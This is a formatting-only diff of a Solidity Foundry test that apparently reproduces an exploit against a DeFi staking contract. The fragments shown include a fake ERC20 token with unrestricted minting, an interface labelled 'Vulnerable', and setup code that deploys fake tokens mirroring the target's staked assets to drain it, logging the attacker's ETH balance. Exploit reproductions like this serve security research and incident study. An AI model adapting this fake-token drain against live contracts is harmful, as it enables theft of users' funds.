@@ -43,7 +43,9 @@ contract MyERC20 {
         return true;
     }
 
-    function mint(uint256 amount) external {
+    function mint(
+        uint256 amount
+    ) external {
         balanceOf[msg.sender] += amount;
         totalSupply += amount;
         emit Transfer(address(0), msg.sender, amount);
@@ -55,7 +57,9 @@ contract MyERC20 {
         emit Transfer(sender, address(0), amount);
     }
 
-    function scaledBalanceOf(address user) external pure returns (uint256) {
+    function scaledBalanceOf(
+        address user
+    ) external pure returns (uint256) {
         return 0;
     }
 
@@ -63,14 +67,18 @@ contract MyERC20 {
         return stakedTokenAddr;
     }
 
-    function scaledBalanceToBalance(uint256 a) external returns (uint256) {
+    function scaledBalanceToBalance(
+        uint256 a
+    ) external returns (uint256) {
         return scaledBalanceToBal;
     }
 }
 
 interface Vulnerable {
     function withdraw(address _restakedTokenAddress, uint256 amount) external;
-    function claim(uint256 withdrawerIndex) external;
+    function claim(
+        uint256 withdrawerIndex
+    ) external;
 }
 
 interface IuniswapV3 {
@@ -106,12 +114,12 @@ contract ASTTest is Test {
         stakedTokens[1] = address(rETH);
         stakedTokens[2] = address(cbETH);
         deal(address(this), 0);
-        uint256[] memory balances = new uint[](3);
+        uint256[] memory balances = new uint256[](3);
         emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
         for (uint8 i = 0; i < stakedTokens.length; i++) {
             uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
             balances[i] = staked_bal;
-            MyERC20 fake_token = new MyERC20(stakedTokens[i],staked_bal);
+            MyERC20 fake_token = new MyERC20(stakedTokens[i], staked_bal);
             fake_token.mint(10_000 * 1e18);
             fake_token.approve(address(vulnerable), type(uint256).max);
 
